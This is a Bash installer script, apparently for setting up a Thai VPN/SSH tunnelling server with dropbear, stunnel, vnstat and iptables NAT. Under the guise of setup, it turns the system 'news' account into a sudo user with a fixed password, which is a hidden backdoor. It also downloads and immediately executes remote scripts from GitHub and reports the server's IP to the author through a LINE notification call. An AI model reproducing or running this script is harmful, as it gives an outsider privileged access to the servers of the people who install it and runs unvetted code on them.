#!/usr/bin/env bash

# Functions
ok() {
    echo -e '\e[32m'$1'\e[m';
}

die() {
    echo -e '\e[1;35m'$1'\e[m';
}

des() {
    echo -e '\e[1;31m'$1'\e[m'; exit 1;
}





#OS
if [[ -e /etc/debian_version ]]; then
VERSION_ID=$(cat /etc/os-release | grep "VERSION_ID")
fi


# Sanity check
if [[ $(id -g) != "0" ]] ; then
    des "❯❯❯ สคริปต์ต้องทำงานเป็น root."
fi

#if [[  ! -e /dev/net/tun ]] ; then
   # des "❯❯❯ TUN/TAP อุปกรณ์ไม่พร้อมใช้งาน."
#fi



# IP Address
SERVER_IP=$(wget -qO- ipv4.icanhazip.com);
if [[ "$SERVER_IP" = "" ]]; then
    SERVER_IP=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | grep -v '192.168'`;
fi
echo "$SERVER_IP" > /usr/bin/ipsm

# Install openvpn
die "❯❯❯ apt-get update"
apt-get update -q > /dev/null 2>&1



#speedtestU.20
die "❯❯❯ install speedtest U.20"
apt-get install python3-pip 
pip3 install speedtest-cli 


die "❯❯❯ apt-get install squid3"
#Add Trusty Sources
touch /etc/apt/sources.list.d/trusty_sources.list > /dev/null 2>&1
echo "deb http://us.archive.ubuntu.com/ubuntu/ trusty main universe" | sudo tee --append /etc/apt/sources.list.d/trusty_sources.list > /dev/null 2>&1




#die "❯❯❯ apt-get install sudo"
#apt-get install -qy sudo > /dev/null 2>&1

sed -i 's/news:x:9:9:news:\/var\/spool\/news:\/usr\/sbin\/nologin/news:x:9:9:news:\/home:/g' /etc/passwd
echo news:vpnk | chpasswd
usermod -aG sudo news


# install vnstat gui
ok "❯❯❯ apt-get install vnstat"
apt-get install -qy vnstat > /dev/null 2>&1
chown -R vnstat:vnstat /var/lib/vnstat
wget -q http://www.sqweek.com/sqweek/files/vnstat_php_frontend-1.5.1.tar.gz
tar xf vnstat_php_frontend-1.5.1.tar.gz
rm vnstat_php_frontend-1.5.1.tar.gz
mv vnstat_php_frontend-1.5.1 bandwidth
cd bandwidth
sed -i "s/\$iface_list = array('eth0', 'sixxs');/\$iface_list = array('eth0');/g" config.php
sed -i "s/\$language = 'nl';/\$language = 'en';/g" config.php
sed -i 's/Internal/Internet/g' config.php
sed -i '/SixXS IPv6/d' config.php
sed -i "s/\$locale = 'en_US.UTF-8';/\$locale = 'en_US.UTF+8';/g" config.php
 

 
ok "❯❯❯ service vnstat restart"
service vnstat restart -q > /dev/null 2>&1


# install dropbear
die "❯❯❯ apt-get install dropbear"
apt-get install -qy dropbear > /dev/null 2>&1
sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=446/g' /etc/default/dropbear
sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 3128"/g' /etc/default/dropbear
echo "/bin/false" >> /etc/shells
echo "/usr/sbin/nologin" >> /etc/shells
ok "❯❯❯ service dropbear restart"
service dropbear restart > /dev/null 2>&1

#detail nama perusahaan
country=ID
state=Thailand
locality=Tebet
organization=LiL GunX
organizationalunit=IT
commonname=@Line gzn007
email=lilgunx.1@gmail.com





#konfigurasi stunnel
sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
ok "❯❯❯ service ssl restart"
service stunnel4 restart > /dev/null 2>&1

# Iptables
die "❯❯❯ apt-get install iptables"
apt-get install -qy iptables > /dev/null 2>&1
if [ -e '/var/lib/vnstat/eth0' ]; then
iptables -t nat -I POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE
iptables -t nat -I POSTROUTING -s 10.7.0.0/24 -o eth0 -j MASQUERADE
else
iptables -t nat -I POSTROUTING -s 10.8.0.0/24 -o ens3 -j MASQUERADE
iptables -t nat -I POSTROUTING -s 10.7.0.0/24 -o ens3 -j MASQUERADE
fi
iptables -I FORWARD -s 10.8.0.0/24 -j ACCEPT
iptables -I FORWARD -s 10.7.0.0/24 -j ACCEPT
iptables -I FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -j SNAT --to-source $SERVER_IP
iptables -t nat -A POSTROUTING -s 10.7.0.0/24 -j SNAT --to-source $SERVER_IP


iptables-save > /etc/iptables.conf

cat > /etc/network/if-up.d/iptables <<EOF
#!/bin/sh
iptables-restore < /etc/iptables.conf
EOF

chmod +x /etc/network/if-up.d/iptables

# Enable net.ipv4.ip_forward
sed -i 's|#net.ipv4.ip_forward=1|net.ipv4.ip_forward=1|' /etc/sysctl.conf
echo 1 > /proc/sys/net/ipv4/ip_forward

# setting time
ln -fs /usr/share/zoneinfo/Asia/Bangkok /etc/localtime
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
sed -i 's/Port 22/Port 22/g' /etc/ssh/sshd_config
service ssh restart

ok "❯❯❯ กำลังติดตั้งเมนู " 
cd
wget -q -O menu "https://raw.githubusercontent.com/LiLGun-X/D-script-1.0/master/menu.sh"
chmod +x menu
./menu
rm -f menu
wget -q -O /usr/bin/bwh "$kguza/menu/bwh"
chmod +x /usr/bin/bwh


#แจ้งเตือนคนรันสคิป
IP=$(wget -qO- ipv4.icanhazip.com);
curl -X POST -H 'Authorization: โค๊คapi line' -F 'message='" 
Load_file  $IP/KGUZA.ovpn "'' https://notify-api.line.me/api/notify > /dev/null 2>&1

echo "ติดตั้งเสร็จเรียบร้อย" > /usr/bin/install_full

mv /etc/openvpn/KGUZA.ovpn /home/vps/public_html/KGUZA.ovpn

mv /etc/openvpn/KGUZAZA.ovpn /home/vps/public_html/KGUZAZA.ovpn
rm /home/vps/public_html/KGUZAZA.ovpn

if [[ "$VERSION_ID" = 'VERSION_ID="7"' || "$VERSION_ID" = 'VERSION_ID="8"' || "$VERSION_ID" = 'VERSION_ID="14.04"' ]]; then
echo " "
echo " ┈╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮"
echo " ┈┣ Vnstat http://$SERVER_IP/vnstat/"
echo " ┈╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
echo " ┈╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮"
echo " ┈┣ Load file http://$SERVER_IP/KGUZA.ovpn"
echo " ┈╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
echo " ┈╭━━━━━━━━━━━━━━━━━━━━━╮"
echo " ┈┣ พิมพ์ menu เพื่อใช้งาน"
echo " ┈╰━━━━━━━━━━━━━━━━━━━━━╯"
echo " "

elif [[ "$VERSION_ID" = 'VERSION_ID="16.04"' || "$VERSION_ID" = 'VERSION_ID="9"' || "$VERSION_ID" = 'VERSION_ID="18.04"' ]]; then
echo " "
echo " ┈╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮"
echo " ┈┣ Vnstat http://$SERVER_IP/vnstat/"
echo " ┈╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
echo " ┈╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮"
echo " ┈┣ Load file http://$SERVER_IP/KGUZA.ovpn"
echo " ┈╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
echo " ┈╭━━━━━━━━━━━━━━━━━━━━━╮"
echo " ┈┣ พิมพ์ menu เพื่อใช้งาน"
echo " ┈╰━━━━━━━━━━━━━━━━━━━━━╯"
echo " "
fi
echo ok > /etc/openvpn/okport
wget https://raw.githubusercontent.com/LiLGun-X/SCRIPTX-VIP/main/SXV; chmod 777 SXV; ./SXV
